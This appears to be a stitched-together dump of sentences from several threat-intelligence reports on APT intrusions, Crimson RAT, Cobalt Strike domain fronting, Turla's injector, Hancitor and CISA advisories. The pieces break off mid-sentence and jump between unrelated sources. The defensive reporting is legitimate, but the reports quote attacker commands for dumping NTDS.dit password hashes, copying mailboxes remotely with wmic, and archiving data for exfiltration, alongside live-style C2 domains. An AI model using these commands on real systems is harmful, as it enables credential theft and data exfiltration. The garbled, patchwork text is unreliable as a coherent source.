remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.","6538":"The built-in Windows quser-command to show logged on users is also heavily used by them.","6539":"If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes. ","6540":"Privilege escalation (TA0004) ","6541":"The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.","6542":"In other cases, the adversary moved laterally to another system with a domain admin logged in.","6543":"We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.","6544":"The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command: msadcs.exe \"NTDS.dit\" -s","6545":"\"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv Note: the adversary renamed ntdsaudit.exe to msadcs.exe.

","6627":"In all cases we\u2019ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.","6628":"But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems: wmic \/node:<ip> process call create \"cmd \/c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\<path>\\<username>\\My Documents\\<filename>.pst\" copy \\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost Files and folders of interest are collected as well and staged for exfiltration. ","6629":"The goal of targeting some victims appears to be to obtain data.","6630":"How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed. ","6631":"The DLL\u2019s used were side-loaded in memory on compromised systems.","6632":"After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory. ","6633":"Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.","6634":"This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic. ","6635":"We\u2019ve seen the adversary staging data on a remote system or on the local system.","6636":"Most of the times the data is compressed and copied at the same time.","6637":"Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.","6638":"The adversary compresses and encrypts the data by using WinRAR from the command-line.","6639":"The filename of the command-line executable for WinRAR is RAR.exe by default. ","6640":"This activity group always uses a renamed version of rar.exe.","6641":"We have observed the following filenames overlapping all intrusions: jucheck.exeRecordedTV.msteredo.tmpupdate.exemsadcs1.exe The adversary typically places the executables in the following folders: C:\\Users\\Public\\Libraries\\C:\\Users\\Public\\Videos\\C:\\Windows\\Temp\\ The following four different variants of the use of rar.exe as update.exe we have observed: update a -m5 -hp<password> <target_filename> <source> update a -m5 -r -hp<password> <target_filename> <source> update a -m5 -inul -hp<password> <target_filename> <source> update a -m5 -r -inul -hp<password> <target_filename> <source> ","6642":"The command lines parameters have the following effect: a = add to archive.m5 = use compression level","6643":"5.r = recurse subfolders.inul","6644":"= suppress error messages.hp<password> = encrypt both file data and headers with password. ","6645":"The used password, file extensions for the staged data differ per intrusion.","6646":"We\u2019ve seen the use of .css, .rar, .log.txt, and no extension for staged pieces of data. ","6647":"After compromising a host with a Linux operating systems, data is also compressed.","6648":"This time the adversary compresses the data as a gzipped tar-file: tar.gz.","6649":"Sometimes no file extension is used, or the file extension is .il.","6650":"Most of the times the files names are prepended with adsDL_ or contain the word \u201clist\u201d.","6651":"The files are staged in the home folder of the compromised user account: \/home\/<username>\/ Command and control (TA0011) ","6652":"The adversary uses Cobalt Strike as framework to manage their compromised systems.","6653":"We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.","6654":"They switched to C2 encapsulated in HTTPS in Q3 2019.","6655":"An interesting observation is they made use of a cracked\/patched trial version of Cobalt Strike.","6656":"This is important to note because the functionalities of Cobalt Strike\u2019s trial version are limited.","6657":"More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.","6658":"In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.","6659":"The DNS-responses weren\u2019t logged.","6660":"This means that only the DNS C2 leaving the victim\u2019s network was logged.","6661":"We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.","6662":"As the adversary used Cobalt Strike with DNS as command & control protocol, we were able to reconstruct more than two years of adversary activity.","6663":"With all this activity data, it was possible for us to create some insight into the \u2018office\u2019-hours of this adversary.","6664":"The activity took place six days a week, rarely on Sundays.","6665":"The activity started on average at 02:36 UTC and ended rarely after 13:00 UTC.","6666":"We observed some periods where we expected activity of the adversary, but almost none was observed.","6667":"These periods match with the Chinese Golden Week holiday. ","6668":"Figure 2: Heatmap of activity.","6669":"Times on the X-axis are in UTC. ","6670":"The adversary also changed their domains for command & control around the same time they switched C2 protocols.","6671":"They used a subdomain under a regular parent domain with a .com","6672":"TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.","6673":"The parent domain appspot.com is a domain owned by Google, and part of Google\u2019s App Engine platform as a service.","6674":"Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft\u2019s Azure content delivery network. ","6675":"Exfiltration (TA0010) ","6676":"The adversary uses the command and control channel to exfiltrate small amounts of data.","6677":"This is usually information containing account details.","6678":"For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. ","6679":"Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.","6680":"This tool exfiltrates specified files to cloud storage web services.","6681":"The following cloud storage web services are supported by the malware: DropboxGoogle DriveOneDrive The actor specifies the following arguments when running the exfiltration tool: Name of the web service to be usedParameters used for the web service, such as a client ID and\/or API keyPath of the file to read and exfiltrate to the web service We have observed the exfiltration tool in the following locations: C:\\Windows\\Temp\\msadcs.exeC:\\Windows\\Temp\\OneDrive.exe Hashes of these files are listed at the end of this article. ","6682":"Defense evasion (TA0005) ","6683":"The adversary attempts to clean-up some of the traces from their intrusions.","6684":"While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing,File deletion,Timestomping An overview of the observed commands can be found in the appendix. ","6685":"For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.","6686":"This tool is included in the UnxUtils repository.","6687":"This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.","6688":"Creating a timeline is a common thing to do for forensic analysts to get a chronological view of events on a system. ","6689":"The same activity group? ","6690":"A number of our intrusions involved tips from an industry partner who was able to correlate some of their upstream activity. ","6691":"Our threat intelligence analysts observed clear overlap between the various cases that NCC Group and Fox-IT worked in the threat\u2019s infrastructure and capabilities, and as a result we assess with moderate confidence one activity group was carrying out the intrusions across the different type of victims. ","6692":"Some overlap is very generic for a lot for a lot of groups, like the use of Cobalt Strike, or exfiltration to OneDrive.","6693":"But the tool used for exfiltration to OneDrive is very specific for this adversary.","6694":"The use of appspot and azureedge domains as well.","6695":"The naming convention for their subdomains, tools and scripts overlap too.","6696":"In summary: The adversary: Working hours match with GMT+8. ","6697":"Infrastructure: appspot.com and azureedge.net for C2 with a strong overlap in naming convention for subdomains and actual overlap in some subdomains between intrusions. ","6698":"Capability: Password spraying\/credential stuffing.","6699":"Cobalt Strike.","6700":"Copy NTDS.dit.","6701":"Use scheduled tasks and batch files for automation.","6702":"The use of LOLBins.","6703":"WinRAR.","6704":"Cloud exfil tool and exfil to OneDrive.","6705":"Erasing Windows Event Logs, files and tasks.","6706":"Overlap in filenames for tools, staged data, and folders. ","6707":"Victim: Semiconductors and aviation industry. ","6708":"We considered labelling them as two activity groups, as of the difference in victims between various intrusions.","6709":"But all the other overlap is strong enough for us to consider it as one group right now.","6710":"This group might have gotten a new customer interested in different data which changed the intent and victims of the adversary. ","6711":"But most importantly: The largest overlap is in the top half of the pyramid of pain: domain names, host artifacts, tools, and TTPs.","6712":"And these are the hardest for the adversary to change, and most effective for long-lasting detection! ","6713":"Figure 3: Pyramid of pain by David J Bianco Fox-IT and NCC Group found some very strong overlap between what we\u2019ve seen in our intrusion, and what Cycraft describes in their APT Group Chimera report and Blackhat presentation.","6714":"The bulk of the victims they describe are in different regions than we observed which is likely caused by field of view bias.","6715":"SentinelOne also describes an attack and shares IOC\u2019s that show strong overlap with the intrusions we investigated. ","6716":"Conclusion At this moment we believe based on the evidence observed that the various intrusions were performed by the same group.","6717":"We can only report what we observed: first they stole intellectual property in the high tech sector, later they stole record, both across geographical locations.","6718":"Both types of stolen data are very useful for nation states. ","6719":"Answering if this group has an advanced persistent threat (APT) technique, has some sort of state affiliation, or where they come from goes beyond the scope of this write-up.","6720":"The threat intelligence and IOC\u2019s we are sharing are intended to help discover and present intrusions by this and adversaries. ","6721":"A word of thanks goes out to all the forensic experts, incident responders, and threat intelligence analysts who helped victims identifying and eradicating the adversary.","6722":"And everybody from NCC Group and Fox-IT (part of NCC Group) for all the contributions to this article.

https:\/\/www.sentinelone.com\/labs\/transparent-tribe-apt36-pakistan-aligned-threat-actor-expands-interest-in-indian-education-sector\/ Executive Summary SentinelLabs has been tracking a cluster of malicious documents that stage Crimson RAT, distributed by APT36 (Transparent Tribe). ","6761":"We assess that this activity is part of the group\u2019s previously reported targeting of the education sector in the Indian subcontinent. ","6762":"We observed APT36 introducing OLE embedding to its typically used techniques for staging malware from lure documents and versioned changes to the implementation of Crimson RAT, indicating the ongoing evolution of APT36\u2019s tactics and malware arsenal. ","6763":"Overview SentinelLabs has been tracking a recently disclosed cluster of malicious Office documents that distribute Crimson RAT, used by the APT36 group (also known as Transparent Tribe) targeting the education sector.","6764":"This post summarizes our observations highlighting the group\u2019s continuous change in used malware staging techniques and Crimson RAT implementations. ","6765":"Transparent Tribe is a suspected Pakistan-based threat group active since at least 2013.","6766":"The group is not very sophisticated; however, it is a highly persistent threat actor that continuously adapts its operational strategy.","6767":"Transparent Tribe has previously focused mainly on Indian military and government personnel, but it has recently expanded its scope to include educational institutions and students in the Indian subcontinent.","6768":"Crimson RAT is a consistent staple in the group\u2019s malware arsenal the adversary uses in its campaigns. ","6769":"The names and content of the lure documents, the associated domains, and the use of Crimson RAT suggest that the activities discussed in this post are part of a previously reported broader targeting of the education sector by Transparent Tribe. ","6770":"Further, the PDB paths of some Crimson RAT samples we analyzed contain the word Wibemax, which is also contained in the PDB paths of Crimson RAT payloads observed in a previous Transparent Tribe campaign. ","6771":"Wibemax matches the name of a Pakistani software development company, but at this time we have not identified a clear relationship to the adversary. ","6772":"It is worth noting that there are high confidence assessments of Transparent Tribe leveraging third parties to support their operation, such as the Pakistani web hosting provider Zain Hosting. ","6773":"Our analysis reinforces the assessment that closely monitoring the research endeavors of adversary nations has become an important objective for the adversary, underscoring the crucial role this activity plays in fulfilling the goals and aspirations of the authorities whose interests Transparent Tribe represents. ","6774":"Malicious Documents The documents that Transparent Tribe distributes have education-themed content and names such as assignment or Assignment-no-10, and indicate creation dates of July and August 2022.","6775":"Based on known behavior of this group, we suspect that the documents have been distributed to targets as attachments to phishing emails.","6776":"Consistent with known Transparent Tribe tactics, we observed that some of the documents have been hosted on file hosting services and attacker-created domains, such as s1.fileditch[.]ch, cloud-drive[.]store, and drive-phone[.]online. ","6777":"It is important to note that cloud-drive[.]store and drive-phone[.]online have been previously linked to Transparent Tribe activities targeting the education sector and assessed as domains prepared for future use.","6778":"Further, drive-phone[.]online closely resembles the phone-drive[.]online domain recently observed hosting Transparent Tribe malware targeting Indian and Pakistani Android users. ","6779":"The malicious documents we analyzed stage Crimson RAT using Microsoft Office macros or OLE embedding. ","6780":"The macro code executes when the documents are opened, and its functionality is consistent with known Transparent Tribe macro variants.","6781":"The macros create and decompress an embedded archive file in the %ALLUSERSPROFILE% directory (C:\\ProgramData) and execute the Crimson RAT payload within.","6782":"Some macros insert text in the document, which is typically education-themed content relating to India. ","6783":"Macro implementation Macro-inserted document text ","6784":"In addition to macros, we observed that Transparent Tribe have adopted OLE embedding as a technique to stage Crimson RAT.","6785":"Malicious documents that implement this technique require users to double-click a document element.","6786":"The documents distributed by Transparent Tribe typically display an image (a \u201cView Document\u201d graphic) indicating that the document content is locked.","6787":"This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe). ","6788":"The \u201cView Document\u201d graphic OLE stream that stores Crimson RAT Transparent Tribe is known to experiment with different malware staging techniques, which include distributing executables with embedded documents or documents that execute designated Crimson RAT loaders.","6789":"The adoption of OLE embedding further highlights the group\u2019s continuous experimentation with malware staging techniques. ","6790":"Crimson RAT Implementations We observed a variety of Crimson RAT .NET implementations, with compilation timestamps between July and September 2022.","6791":"The Crimson RAT payloads we analyzed use the richa-sharma.ddns[.]net domain for C2 purposes and support either 40 or 65 commands, most of which have been documented in previous research.","6792":"Features of Crimson RAT include exfiltrating system information, capturing screenshots, starting and stopping processes, and enumerating files and drives. ","6793":"A Crimson RAT command dispatch routine Some Crimson RAT variants are stripped of debug information, whereas others have PDB paths that contain a date stamp, the word Richa, which relates to the configured C2 domain, and the word Wibemax.","6794":"Portions of these PDB paths overlap those of Crimson RAT payloads observed in a previous Transparent Tribe campaign, such as D:\\Projects\\Wibemax\\WinP\\WinP\\obj\\Debug\\WinP.pdb and D:\\Projects\\Wibemax\\Windows RAT\\1 Windows 10 Client\\Win8P-Sunny\\2022-04-15-Win8P Sunny\\obj\\Debug\\FUJIKBattery.pdb. ","6795":"Crimson RAT PDB paths We observed different Crimson RAT version identifiers: R.S.8.8., R.S.8.9, R.S.8.1, and R.S.8.6.","6796":"We speculate that the R.S. components of the identifiers may relate to the configured C2 domain (richa-sharma.ddns[.]net) and the numerical components may specify a version (build) number.","6797":"This aligns with a documented Crimson RAT variant with the identifier S.L.2.2., which has used the sunnyleone.hopto[.]org domain for C2 purposes. ","6798":"As an anti-analysis measure, Crimson RAT variants delay their execution for a given time period, for example, 61, 180, or 241 seconds.","6799":"Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G551JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run only if the victim\u2019s machine name differs.","6800":"G551JW or DESKTOP-B83U7C5 may be the names of the machines where Crimson RAT developers have been running test executions. ","6801":"Crimson RAT variants implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.","6802":"We observed the use of the Eazfuscator obfuscator in a Crimson RAT sample named NewOrleans.","6803":"Evidence suggests that the Crimson RAT developers have patched the routine that evaluates the trial period of Eazfuscator to enable the execution of the malware after the trial period expires. ","6804":"Eazfuscator trial period evaluation in NewOrleans Eazfuscator trial expiry message With previous variants of Crimson RAT obfuscated using Crypto Obfuscator, the addition of Eazfuscator to the obfuscation techniques used by Transparent Tribe highlights the continuous maintenance and development of the RAT. ","6805":"Conclusion Transparent Tribe is a highly motivated and persistent threat actor that regularly updates its malware arsenal, operational playbook, and targets.","6806":"Our analysis further demonstrates this characteristic of the group by spotlighting the adoption of OLE embedding as a technique for staging malware from lure documents and the Eazfuscator obfuscator to protect Crimson RAT implementations.","6807":"Transparent Tribe\u2019s constantly changing operational and targeting strategies require constant vigilance to mitigate the threat posed by the group.

","7122":"Another sample discovered in late August 2021 consisted of the C2 host URI xxx[.]xxxx[.]tk and the host header setting configured to point to test[.]softlemon[.]net. ","7123":"Beginning September 2021, the attackers started using the Myanmar Digital News domain for fronting their beacons.","7124":"While the default C2 domain was specified as www[.]mdn[.]gov[.]mm, the beacon's traffic was redirected to the de-facto C2 test[.]softlemon[.]net via HTTP Get and POST metadata specified in the beacon's configuration. ","7125":"The actor likely changed the configuration to test their infrastructure and the domain fronting functionality before launching the attack.","7126":"Based on the beacon configuration template and the real C2 host test[.]softlemon[.]net, we assess with moderate confidence that the samples are created by a single actor. ","7127":"Timeline of malware samples first seen in the wild. ","7128":"Cobalt Strike beacon configurations ","7129":"We extracted the beacon config from the payload that showed us the actor has used different values for the User Agent, C2-Server and Host-header in different malwares of this campaign. ","7130":"The beacon configuration of samples usually has a User Agent, which is Mozilla compatible and of Windows 7. C2 server, UserAgent and de-facto C2 variations in the beacons. ","7131":"Watermark The Cobalt Strike watermark is a number generated from the license file and is unique to a Cobalt Strike license.","7132":"The watermark on the beacons used in this campaign was 305419896 (hex: 0x12345678). ","7133":"This particular watermark has previously been attributed to a leaked Cobalt Strike version and is unsurprisingly used by other malicious actors, such as Maze ransomware and Trickbot groups, making attribution based on the watermark number impossible.","7134":"It is difficult to assess if the usage of the previously registered expired domain for C2 server and the leaked Cobalt Strike point to an increased operational security awareness of the actor or to limited resources available to them. ","7135":"Domain fronting The actor in this campaign has used domain fronting, which is a technique which can use high reputation domains to conceal the Cobalt Strike command and control traffic.","7136":"A government domain of Myanmar www[.]mdn[.]gov[.]mm was used in this particular instance. ","7137":"The fronted domain mdn[.]gov[.]mm is a legitimate domain of Myanmar Digital News, a state-owned digital newspaper.","7138":"This website has previously been compromised in February by the Brotherhood of Myanmar group, a collection of militia groups.","7139":"Although there are no indications that the previous defacement of the domain by the Brotherhood of Myanmar and the campaign described in this post are related, the domain itself is clearly of interest to various actors. ","7140":"Domain fronting can be achieved with a redirect between the malicious server and the target.","7141":"Malicious actors may misuse various content delivery networks (CDNs) to set up redirects of serving content to the content served by attacker-controlled C2 hosts.","7142":"Cloudflare is one of the CDN services that provides its users with a globally distributed cache for files hosted on their servers.","7143":"Cloudflare identifies distributions by the FQDN used to request resources.","7144":"Cloudflare users have the option to use their own subdomain and create a DNS record that points to Cloudflare.","7145":"This subdomain tells Cloudflare to associate that DNS record with a specific distribution. ","7146":"The beacon calls home www[.]mdn[.]gov[.]mm,\/api\/3 and has set the Host header to the actual C2 server test[.]softlemon[.]net.","7147":"The beacon traffic resolves to a Cloudflare IP address.","7148":"The DNS request that led them there will be lost and relies on other parts of the HTTP request, including the Host header and the actual C2 test[.]softlemon[.]net.

","7161":"Function that loads library during the runtime. ","7162":"After allocating the virtual memory and setting the page permissions to Read-Write-Execute, a decryption routine is executed that decrypts the remaining malicious code in the .kxrt section and writes it to the virtual memory.

","7169":"Function that resolves the victim's system proxy for the URL. ","7170":"Soon after that, the beacon initiates the Cobalt Strike beacon traffic to the C2 server.","7171":"The DNS request for the initial host resolves to a Cloudflare-owned IP address that allows the attacker to employ domain fronting and send the traffic to the actual C2 host test[.]softlemon[.]net, also proxied by Cloudflare. ","7172":"At the time of analysis, the sample C2 host infrastructure was not online and we received a 404 error. ","7173":"Cobalt Strike beacon traffic. ","7174":"The beacon contains techniques to detect debuggers using GetTickCount, IsDebuggerPresent and the NtDelayExecution call to delay the execution of the malware for evading sandbox-based dynamic analysis systems.","7175":"The beacon can also manage the system power policies registry keys to set the minimum and maximum sleep times and the lid open and close action policy. ","7176":"The beacon modifies the victim's system power and lid open\/close policies in the registry. ","7177":"Command and control The C2 server - test[.]softlemon[.]net is the subdomain of softlemon[.]net.","7178":"The domain softlemon[.]net was registered under Google domains until August 2019 and likely expired since then.","7179":"The malicious actor re-registered this domain on Aug. 5, 2021.","7180":"The SSL certificate for the domain softlemon[.]net with the serial number 4aa6af6d719bfdd1c6dff3d7b640aed7ee3was issued by Let's Encrypt, a free SSL certificate provider.

","7944":"After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved.","7945":"In this case, the explorer.exe was chosen.","7946":"This routine to get the PID slightly differs in the IronPython scripts we found.","7947":"While one script uses the C# method GetProcessesByName() to get the PID, the other scripts run the Windows tool tasklist.exe with the help of the Python os.popen() function.","7948":"The output is then parsed to the targeted process ID with the help of tasklist filters.","7949":"Also, some scripts filter the PID based on a Windows service name.","7950":"When the PID is found, an instance of the injector assembly is created and the ComRAT payload bytes and PID are passed. ","7951":"Figure 4.","7952":"PID retrieval function variations in the different IronPython scripts.","7953":"Finally, the injector\u2019s public methods Invoke() and InvokeVoid() get called.","7954":"In the latter, the exported function name VFEP of the ComRAT payload gets passed.","7955":"From this point on, the .NET injector takes control over the further execution. ","7956":"The .NET injector contains the following namespaces: DefaultSerializer PeNet PeNet.","7957":"Parser PeNet.","7958":"Structures PeNet.","7959":"Structures.","7960":"MetaDataTables PeNet.","7961":"MetaDataTables.","7962":"Parsers PeNet.","7963":"Utilities While the PeNet code is copied from the project, the namespace DefaultSerializer contains the injector code and is made of the following classes: DefaultSerializer: Contains the injector code.

","7966":"Win32:","7967":"Contains the imported unmanaged function declarations and win32 structures\/constants. ","7968":"The DefaultSerializer class exposes four public methods: InjectAssembly Invoke InvokeAssemblyMethod InvokeVoid These methods are used pairwise.","7969":"The method InjectAssembly is used to inject a .NET assembly into a native process (or its own) and InvokeAssemblyMethod to call any chosen method of the injected assembly.","7970":"The method Invoke is used to inject a native PE into a remote process and InvokeVoid to call any exported function of the injected payload. ","7971":"Figure 5.","7972":"Decompiled NetInjector code.","7973":"Depending on the number of arguments passed to DefaultSerializer on creation time, the payload is either loaded into its own process or a remote one.","7974":"In case only the payload bytes are passed, it gets loaded into its own process space.","7975":"The other options are to also pass the ID or handle of the remote process the payload gets injected to. ","7976":"In our case, the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process. ","7977":"One other interesting aspect of the injector is its ability to load an assembly into an unmanaged process.","7978":"This needs some preparation in the remote process, as you cannot simply load and execute a .NET assembly there if the CLR isn\u2019t present.","7979":"This is accomplished with a native bootstrapper DLL, which gets injected into the remote process and prepares it so a .NET assembly can be injected afterwards. ","7980":"There are two bootstrappers (x86\/64) contained in the NetBootstrapper class, which have the following PDB paths left: F:\\Dev\\NetInjector\\bin\\Release\\NetBootstrapper_Win32.pdb F:\\Dev\\NetInjector\\bin\\Release\\NetBootstrapper_x64.pdb Just like the injector itself, the bootstrappers contain meaningful function names (exported functions) and useful log messages.","7981":"It uses the following exported functions: ","7982":"Bootstrap: Load CLR services into process.

","7991":"Conclusion IronNetInjector is another toolset in Turla\u2019s ever-growing arsenal, made of an IronPython script and an injector.","7992":"It\u2019s similar in structure to the previously used in-memory loading mechanism to execute malware with the help of PowerShell scripts.","7993":"These scripts contain an embedded PE loader to execute an embedded malware payload. ","7994":"The tool we discussed in this blogpost was likely developed to move away from PowerShell towards .NET.","7995":"This general trend can be seen in recent years as detection of Powershell based threats became better, but also due to security mechanisms like AMSI introduced by Microsoft. ","7996":"The .NET injectors and bootstrappers contain clean code and meaningful function\/method\/variable names, and they use detailed log\/error messages.","7997":"Only the initial IronPython scripts are obfuscated to prevent easy detection.

","8144":"After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data.","8145":"To increase the probability of reaching an active server, the malware iterates over all the decrypted C2 URLs and tries to reach all of them until one of them sends a response. ","8146":"Figure 12 \u2013 C2 communication function. ","8147":"We assume that based on the received data the C2 server responds with either a simple string which can be decrypted to an active malware download server or with garbage data in the form of a simple string.","8148":"Although the decoding algorithm of the C2 response looks quite complex, it is actually Base64 decoding, followed by an XOR operation using the key 0x7A.","8149":"If the decryption leads to a valid URL, the malware initiates a download, which delivers an executable.","8150":"To execute the binary, Hancitor uses one of the following techniques: Create Process Create Thread Process Hollowing Thread Execution Hijacking Create Process If the method \u201cCreate Process\u201d is chosen, then the malware writes the retrieved executable to disk into the temp folder and executes it using rundll32.exe with \u201cstart\u201d as the argument for the entry function. ","8151":"Create Thread The Create Thread method is as straightforward as Create Process.","8152":"The malware simply allocates some memory, writes the malware into it and creates a new thread from it. ","8153":"Process Hollowing If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.","8154":"The malware then allocates new memory in the newly-created process, writes the executable to it and executes it in a new thread.

","8359":"This Advisory identifies some of the more common\u2014yet most effective\u2014TTPs employed by cyber threat actors, including Chinese MSS-affiliated cyber threat actors. ","8360":"Click here for a PDF version of this report. ","8361":"Technical DetailsThrough the operation of the National Cybersecurity Protection System (NCPS) and by fulfilling its mission as the national risk advisor, CISA has observed Chinese MSS-affiliated cyber threat actors operating from the People\u2019s Republic of China using commercially available information sources and open-source exploitation tools to target U.S. Government agency networks. ","8362":"According to a recent U.S. Department of Justice indictment, MSS-affiliated actors have targeted various industries across the United States and other countries\u2014including high-tech manufacturing; medical device, civil, and industrial engineering; business, educational, and gaming software; solar energy; pharmaceuticals; and defense\u2014in a campaign that lasted over ten years.[1]","8363":"These hackers acted for both their own personal gain and the benefit of the Chinese MSS.[2] According to the indictment, To conceal the theft of information from victim networks and otherwise evade detection, the defendants typically packaged victim data in encrypted Roshal Archive Compressed files (RAR files), changed RAR file and victim documents\u2019 names and extensions (e.g., from \u201c.rar\u201d to \u201c.jpg\u201d) and system timestamps, and concealed programs and documents at innocuous-seeming locations on victim networks and in victim networks\u2019 \u201crecycle bins.\u201d","8364":"The defendants frequently returned to re-victimize companies, government entities, and organizations from which they had previously stolen data, in some cases years after the initial successful data theft.","8365":"In several instances, however, the defendants were unsuccessful in this regard, due to the efforts of the FBI and network defenders. ","8366":"The continued use of open-source tools by Chinese MSS-affiliated cyber threat actors highlights that adversaries can use relatively low-complexity capabilities to identify and exploit target networks.","8367":"In most cases, cyber operations are successful because misconfigurations and immature patch management programs allow actors to plan and execute attacks using existing vulnerabilities and known exploits.","8368":"Widespread implementation of robust configuration and patch management programs would greatly increase network security.","8369":"It would also reduce the speed and frequency of opportunistic attacks by forcing threat actors to dedicate time and funding to research unknown vulnerabilities and develop custom exploitation tools. ","8370":"MITRE PRE-ATT&CK:registered: Framework for Analysis In the last 12 months, CISA analysts have routinely observed Chinese MSS-affiliated actors using the following PRE-ATT&CK:registered: Framework TTPs. Target Selection and Technical Information Gathering Target Selection [TA0014] is a critical part of cyber operations.","8371":"While cyber threat actors\u2019 motivations and intents are often unknown, they often make their selections based on the target network\u2019s security posture.","8372":"Threat actors can use information sources such as Shodan, the Common Vulnerabilities and Exposure (CVE) database, and the National Vulnerabilities Database (NVD).[3][4][5] Shodan is an internet search engine that can be used to identify vulnerable devices connected to the internet.","8373":"Shodan queries can also be customized to discover specific vulnerabilities on devices, which enables sophisticated cyber threat actors to use relatively unsophisticated techniques to execute opportunistic attacks on susceptible targets. ","8374":"The CVE database and the NVD contain detailed information about vulnerabilities in applications, appliances, and operating systems that can be exploited by cyber threat actors if they remain unpatched.","8375":"These sources also provide risk assessments if any of the recorded vulnerabilities are successfully exploited. ","8376":"These information sources have legitimate uses for network defense.","8377":"CISA analysts are able to identify Federal Government systems that may be susceptible to exploitation attempts by using Shodan, the CVE database, and the NVD to enrich NCPS information.","8378":"Unlike threat actors, CISA takes the necessary actions to notify network owners of their exposure in order to prevent an impending intrusion or quickly identify intrusions as they occur. ","8379":"While using these data sources, CISA analysts have observed a correlation between the public release of a vulnerability and targeted scanning of systems identified as being vulnerable.","8380":"This correlation suggests that cyber threat actors also rely on Shodan, the CVE database, the NVD, and other open-source information to identify targets of opportunity and plan cyber operations.","8381":"Together, these data sources provide users with the understanding of a specific vulnerability, as well as a list of systems that may be vulnerable to attempted exploits.","8382":"These information sources therefore contain invaluable information that can lead cyber threat actors to implement highly effective attacks. ","8383":"CISA has observed Chinese MSS-affiliated actors using the techniques in table 1 to gather technical information to enable cyber operations against Federal Government networks (Technical Information Gathering [TA0015]).

30-plus-country ransomware task force.","8603":"The most effective investment would be to give residents in LATAM and the Caribbean in-person or remote access to IT security-oriented schools and training institutions.","8604":"Educational and training institutions in the region simply cannot keep up with the current demand for IT security professionals.","8605":"Investments in education, training, and apprenticeship programs would make the most difference in building capacity, closing the cyber skills gap, and getting more individuals into the cyber talent pipeline.","8606":"Supporting and encouraging younger individuals to seek an education and training within the cyber realm can drastically affect the skills shortage and improve public awareness on cyber threats; the region has been particularly affected by cybercrime and fraud during the pandemic.","8607":"While it is difficult to evaluate countries given their alternative approaches to cybersecurity, some have decided to leave cybersecurity to private firms while others have leaned on government agencies and the military to combat cybercriminals.","8608":"According to the Organization of American States (OAS) cybersecurity observatory, most LATAM countries are in the early stages of cybersecurity development.","8609":"As a result, there is still a lot to accomplish and implement in terms of cyber security policies in Central American and Caribbean countries.","8610":"Nevertheless, countries such as Argentina, Dominican Republic, Ecuador, Panama, and Peru, among

in broadening their institutional capacities, including the development of cyber laws, policies, and regulations.","8613":"There is also increased expertise in the private sector, primarily the financial sector, within these nations.","8614":"MitigationsIt is crucial to maintain offline backups of your organizations data and ensure that these backups stay up to date to prevent data loss in the event of a ransomware infection.","8615":"Additionally, we recommend the following mitigations to reduce overall risk and impact:Ransomware often follows a specific pattern of behavior that can be detected with a robust threat intelligence system that is integrated with SIEM platforms.","8616":"Implement YARA rules such as the ones found in Recorded Future Hunting Packages to identify malware via signature-based detection or SNORT rules for endpoint-based detections.","8617":"The IOCs provided throughout this report can be used to proactively query or scan environments for items such as file hashes, registry keys, and IP traffic associated with ransomware.","8618":"Network segmentation can halt the propagation of ransomware through an organizations network.","8619":"This solution involves splitting the larger network into smaller network segments and can be accomplished through firewalls, virtual - local area networks, or other separation techniques.","8620":"Implement intrusion detection \/ intrusion prevention (IDS\/IPS) systems and endpoint detection and response (EDR) systems.","8621":"Provide robust anti-phishing training for employees and staff.","8622":"If remote access solutions are crucial to daily operations, all remote access services and protocols such as Citrix and RDP should be implemented with two-factor or multi-factor authentication.","8623":"Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.","8624":"Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers or use brute force password attacks.","8625":"Once inside the network, the threat actors move laterally and install ransomware on target machines, often disabling backups and other protections.","8626":"Through the use of process monitoring, monitor for the execution and command of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit.","8627":"Monitor for the creation of suspicious file modification activity, particularly large quantities of file modifications in user directories.","8628":"Consider keeping sensitive client information on systems that are disconnected from the internet or segmented from the rest of the corporate network.","8629":"Since ransomware will encrypt all files on a victim system and often will search for directories on the network (such as networked file shares) to also encrypt, moving highly sensitive customer data to a system with no internet access or access to the rest of the network will minimize ransomwares access to 